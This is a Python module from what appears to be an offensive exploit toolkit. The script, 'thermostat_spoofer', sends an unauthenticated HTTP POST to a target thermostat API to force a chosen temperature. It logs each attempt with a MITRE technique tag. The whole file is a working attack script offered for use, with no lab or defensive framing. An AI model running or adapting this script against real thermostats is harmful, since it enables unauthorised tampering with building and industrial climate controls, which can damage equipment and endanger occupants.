# modules/exploits/thermostat_spoofer.py

import argparse
import requests
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T0887"  # Climate Control Manipulation

def log_thermo_spoof(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def spoof_temperature(endpoint, target_temp):
    payload = {"desired_temp": target_temp}
    try:
        res = requests.post(endpoint, json=payload, timeout=3)
        if res.ok:
            print(f"[✓] Thermostat spoofed to {target_temp}°C")
        else:
            print(f"[!] Failed: {res.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")

    log_thermo_spoof({
        "timestamp": datetime.utcnow().isoformat(),
        "endpoint": endpoint,
        "spoofed_temp": target_temp,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Thermostat Spoofing Module")
    parser.add_argument("--endpoint", required=True, help="Target thermostat HTTP API")
    parser.add_argument("--temp", type=float, required=True, help="Spoofed temperature in °C")
    args = parser.parse_args()

    spoof_temperature(args.endpoint, args.temp)
